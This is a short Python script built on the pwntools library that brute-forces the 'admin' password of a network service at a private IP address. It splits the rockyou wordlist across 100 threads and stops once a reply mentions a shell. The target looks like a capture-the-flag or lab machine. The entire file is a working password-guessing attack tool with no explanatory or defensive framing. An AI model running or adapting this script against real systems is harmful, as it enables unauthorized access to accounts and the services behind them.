#!/usr/bin/env python3

from pwn import remote, context
import threading

target_ip = "10.49.184.200"
target_port = 8000
wordlist = "/usr/share/wordlists/rockyou.txt"
stop_flag = threading.Event()
num_threads = 100


def brute_force_pass(passwords):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for i in range(len(passwords)):
        if stop_flag.is_set():
            r.close()
            return
        if i % 3 == 0:
            r.sendline(b"admin")
            r.recvuntil(b"Password:\n")
        r.sendline(passwords[i].encode())
        try:
            if b"shell" in r.recvline(timeout=0.5):
                stop_flag.set()
                print(f"[+] Password found: {passwords[i]}")
                r.close()
                return
        except:
            pass
    r.close()
    return


def main():
    print("Chuong trinh brute-force de tim mat khau hop le!")
    passwords = [line.strip() for line in open(wordlist, "r", encoding="utf-8", errors="ignore")]
    passwords_length = len(passwords)
    step = (passwords_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, passwords_length)
        if start < passwords_length:
            thread = threading.Thread(target=brute_force_pass, args=(passwords[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()
